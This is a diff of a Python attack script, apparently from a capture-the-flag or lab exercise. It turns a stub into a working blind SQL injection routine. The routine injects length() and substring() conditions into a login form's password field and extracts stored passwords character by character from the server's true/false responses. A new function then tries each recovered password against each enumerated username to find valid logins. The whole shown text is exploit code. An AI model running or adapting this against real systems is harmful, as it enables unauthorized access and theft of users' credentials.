@@ -126,15 +126,41 @@ def getUsersOptomized():
 
     return done
 
-def getPasswords(users):
+def getPasswords(max_lenght):
     partial = []
     done = []
-    for user in users:
-        for i in iter.chain(range(48,58), range(97, 123)):
-            params = {'username': user, 'password': "' or length(password)=1 and substring(password, 1, 1)=" + '\"' + str(chr(i)) + '\"' + " -- '"}
-    return partial, done
-def main():
-    users = ['a', 'bob', 'adm', 'fred', 'bill', 'admin', 'richard']#getUsersOptomized()
     
-    print(getPasswords(users))
+
+    for i in iter.chain(range(48,58), range(97, 123)):
+        params = {'username': '', 'password': "' or length(password)=1 and substring(password, 1, 1)=" + '\"' + str(chr(i)) + '\"' + " -- '"}
+        if get_answer(params):
+            done.append(str(chr(i)))
+        params = {'username': '', 'password': "' or length(password)!=1 and substring(password, 1, 1)=" + '\"' + str(chr(i)) + '\"' + " -- '"}
+        if get_answer(params):
+            partial.append(str(chr(i)))
+
+    for x in range(1, max_lenght + 1):
+        for word in partial:
+            for i in iter.chain(range(48,58), range(97, 123)):
+                params = {'username': '', 'password': "' or length(password)="+ str(x) + " and substring(password, 1, " + str(x) + " )=" + '\"' + word + str(chr(i)) + '\"' + " -- '"}
+                if get_answer(params):
+                    done.append(word + str(chr(i)))
+                params = {'username': '', 'password': "' or length(password)!="+ str(x) + " and substring(password, 1, " + str(x) + " )=" + '\"' + word + str(chr(i)) + '\"' + " -- '"}
+                if get_answer(params):
+                    partial.append(word + str(chr(i)))
+
+    return done
+
+def matchPasswords(users, passwords):
+
+       for user in users:
+           for password in passwords:
+                params = {'userName': user, 'password': password}
+                #print (params)
+                if get_answer(params):
+                    print(user, ": ", password) 
+def main():
+    users = getUsersOptomized()
+    passwords = getPasswords(8)
+    matchPasswords(users, passwords)
 main()
